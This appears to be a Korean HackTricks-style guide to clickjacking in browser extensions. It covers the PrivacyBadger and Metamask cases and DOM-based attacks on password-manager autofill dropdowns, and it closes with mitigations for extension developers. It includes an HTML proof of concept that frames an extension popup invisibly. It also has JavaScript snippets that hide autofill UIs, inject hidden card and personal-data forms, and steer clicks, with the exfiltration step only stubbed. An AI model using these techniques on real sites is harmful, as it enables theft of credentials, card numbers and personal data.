# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

이 페이지는 브라우저 확장의 ClickJacking 취약점을 악용합니다.\
ClickJacking이 무엇인지 모른다면 다음을 확인하세요:


{{#ref}}
../clickjacking.md
{{#endref}}

확장 프로그램에는 파일 **`manifest.json`** 이 포함되어 있고, 해당 JSON 파일에는 `web_accessible_resources` 필드가 있습니다. 다음은 [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) 에서 이에 대해 설명하는 내용입니다:

> 이러한 리소스는 웹페이지에서 URL **`chrome-extension://[PACKAGE ID]/[PATH]`** 를 통해 사용 가능해지며, 이는 **`extension.getURL method`** 로 생성할 수 있습니다. Allowlisted 리소스는 적절한 CORS 헤더와 함께 제공되므로 XHR과 같은 메커니즘으로 접근할 수 있습니다.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

브라우저 확장 내의 **`web_accessible_resources`** 는 단순히 웹을 통해 접근 가능한 것뿐만 아니라 확장의 고유 권한으로도 동작합니다. 즉, 다음과 같은 기능을 수행할 수 있습니다:

- 확장의 상태를 변경
- 추가 리소스를 로드
- 브라우저와 일정 수준 상호작용

하지만 이 기능은 보안 위험을 초래합니다. **`web_accessible_resources`** 안의 리소스가 중요한 기능을 가지고 있다면 공격자는 해당 리소스를 외부 웹 페이지에 삽입할 수 있습니다. 이 페이지를 방문한 사용자가 의도치 않게 삽입된 리소스를 활성화할 수 있으며, 그 결과 확장 프로그램의 권한과 기능에 따라 예기치 않은 영향을 초래할 수 있습니다.

## PrivacyBadger 예제

PrivacyBadger 확장에서는 `skin/` 디렉토리가 다음과 같이 `web_accessible_resources`로 선언된 것과 관련된 취약점이 발견되었습니다 (원문 [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html) 를 확인하세요):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
이 구성은 잠재적인 보안 문제를 초래했습니다. 구체적으로 브라우저에서 PrivacyBadger 아이콘과 상호작용할 때 렌더링되는 `skin/popup.html` 파일이 `iframe`에 포함될 수 있었습니다. 이러한 포함은 사용자를 속여 "Disable PrivacyBadger for this Website"를 실수로 클릭하게 만들기 위해 악용될 수 있었습니다. 이로 인해 PrivacyBadger 보호가 비활성화되어 사용자의 프라이버시가 손상되고 추적 위험이 증가할 수 있습니다. 이 익스플로잇의 시각적 시연은 ClickJacking 비디오 예제에서 확인할 수 있습니다: [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

이 취약점을 해결하기 위해 간단한 조치가 취해졌습니다: `web_accessible_resources` 목록에서 `/skin/*`를 제거했습니다. 이 변경으로 `skin/` 디렉터리의 콘텐츠가 웹 접근 가능 리소스를 통해 접근되거나 조작되는 것을 방지하여 위험을 완화했습니다.

수정은 간단했습니다: **`web_accessible_resources`에서 `/skin/*`를 제거했습니다.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask 예시

[**Metamask의 ClickJacking에 대한 블로그 포스트는 여기에서 볼 수 있습니다**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). 이 경우 Metamask는 접근에 사용된 프로토콜이 **`https:`** 또는 **`http:`**인지 확인하여 취약점을 수정했다(예: **`chrome:`**은 제외):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Metamask 확장 기능에서 수정된 또 다른 ClickJacking**은 페이지가 `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` 때문에 피싱으로 의심될 때 사용자가 **Click to whitelist**할 수 있었던 문제였다. 해당 페이지가 Clickjacking에 취약했기 때문에 공격자는 평범해 보이는 것을 보여 피해자가 눈치채지 못한 채 허용하도록 클릭하게 만들고, 이후 다시 피싱 페이지로 돌아가면 그 페이지가 허용 목록에 올라가게 된다.

## Steam Inventory Helper 예시

다음 페이지에서 browser extension의 **XSS**가 어떻게 **ClickJacking** 취약점과 연쇄되었는지 확인할 수 있다:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

클래식한 extension clickjacking은 잘못 구성된 `web_accessible_resources`를 악용해 권한 있는 HTML을 iframe으로 불러오고 사용자의 클릭을 유도한다. 보다 최근의 유형인 DOM-based extension clickjacking은 password managers가 페이지 DOM에 주입하는 autofill 드롭다운을 직접 겨냥하여 CSS/DOM 트릭으로 이를 숨기거나 가려도 클릭은 가능하도록 만든다. 한 번의 강제 클릭으로 저장된 항목을 선택하게 하고 공격자가 제어하는 입력에 민감한 데이터를 채우게 할 수 있다.

### 위협 모델

- 공격자가 웹페이지를 제어하거나(또는 관련 도메인에서 XSS/subdomain takeover/cache poisoning을 달성).
- 피해자는 password manager extension을 설치하고 잠금 해제한 상태(일부는 명목상 잠겨 있어도 autofill이 동작).
- 적어도 하나의 사용자 클릭이 유도됨(오버레이된 cookie 배너, 대화상자, CAPTCHAs, 게임 등).

### 공격 흐름 (수동 autofill)

1. 보이지 않지만 포커스가 가능한 폼을 주입(로그인/PII/credit-card 필드).
2. 입력에 포커스를 주어 확장 기능의 autofill 드롭다운을 필드 근처에 소환.
3. 확장 UI를 숨기거나 가려서 보이지 않게 하되 상호작용은 가능하게 유지.
4. 숨겨진 드롭다운 아래에 그럴듯한 컨트롤을 정렬해 클릭을 유도하여 항목을 선택하게 함.
5. attacker form에 채워진 값을 읽어 탈취(외부 전송).

### autofill UI 숨기는 방법

- 확장 요소
- 루트 요소 투명도 (일반적):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- 열린 ShadowRoot 내부의 자식(동적 태그, 내부 iframe 숨기기):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- 부모 요소
- BODY/HTML opacity 트릭 — 페이지가 정상적으로 보이는 동안 확장 프로그램 UI를 보이지 않게 만들기 (예: 스크린샷 배경):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- 오버레이
- 부분 오버레이: 드롭다운이 클릭 가능한 상태를 유지하도록 몇 픽셀만 보이게 하고 나머지는 가리기(공격자 오버레이가 DOM에서 마지막에 위치하고 max z-index를 가지도록 보장하거나 Top Layer 사용).
- pointer-events:none을 사용한 전체 오버레이로 클릭을 숨겨진 드롭다운으로 통과시키기; Popover API로 이를 지속적으로 유지:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### 피해자 클릭 위치 지정

- Fixed placement: 숨겨진 드롭다운을 “쿠키 수락”, “닫기”, 또는 CAPTCHA 체크박스와 같은 그럴듯한 컨트롤 아래에 배치한다.
- Follow-mouse: 포커스된 입력 요소를 커서 아래로 이동시켜 드롭다운이 이를 따라오게 한다; 주기적으로 포커스를 재설정하여 어디서든 단일 클릭으로 항목이 선택되도록 한다:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### 영향 및 시나리오

- 공격자 제어 사이트: 강제 클릭 한 번으로 도메인 범위에 한정되지 않는 신용카드 정보(번호/유효기간/CVC)와 개인정보(이름, 이메일, 전화번호, 주소, 생년월일)를 유출할 수 있습니다.
- 신뢰된 사이트 (XSS/subdomain takeover/cache poisoning): 여러 번의 클릭으로 자격 증명(사용자명/비밀번호) 및 TOTP를 탈취할 수 있습니다. 많은 매니저가 관련 서브도메인/상위 도메인(예: `*.example.com`) 전반에 걸쳐 자동완성을 하기 때문입니다.
- Passkeys: RP가 WebAuthn 챌린지를 세션에 바인딩하지 않으면 XSS가 서명된 어설션을 가로챌 수 있습니다; DOM-based clickjacking은 passkey 프롬프트를 숨겨 사용자의 확인 클릭을 유도합니다.

### 한계

- 최소한 한 번의 사용자 클릭과 적절한 픽셀 정렬이 필요합니다(현실적인 오버레이는 클릭을 유도하기 쉽습니다).
- 자동 잠금/로그아웃은 착취 가능한 시간을 줄입니다; 일부 매니저는 "잠김" 상태에서도 여전히 자동완성을 수행합니다.

### 확장 개발자 완화 방안

- 자동완성 UI를 Top Layer (Popover API)에서 렌더링하거나, 또는 페이지 스택 상단에 위치하도록 보장하세요; 페이지 제어 오버레이에 가려지지 않도록 하세요.
- CSS 변조에 대비: Closed Shadow DOM을 우선 사용하고 UI 루트에서 의심스러운 스타일 변경을 감지하기 위해 `MutationObserver`로 모니터링하세요.
- 채우기 전에 적대적 오버레이를 감지: 다른 top-layer/popover 요소들을 열거하고, 일시적으로 `pointer-events:none`을 비활성화한 뒤 `elementsFromPoint()`를 사용해 가림(occlusion)을 감지하세요; 오버레이가 존재하면 UI를 닫으세요.
- 렌더 전후 모두 `<body>`/`<html>`의 opacity 또는 스타일 변경을 감지하세요.
- iframe 기반 이슈의 경우: MV3 `web_accessible_resources`의 `matches`를 좁게 범위 지정하고 HTML UI 노출을 피하세요; 불가피한 HTML에는 `X-Frame-Options: DENY` 또는 `Content-Security-Policy: frame-ancestors 'none'`를 제공하세요.


## 참고자료

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
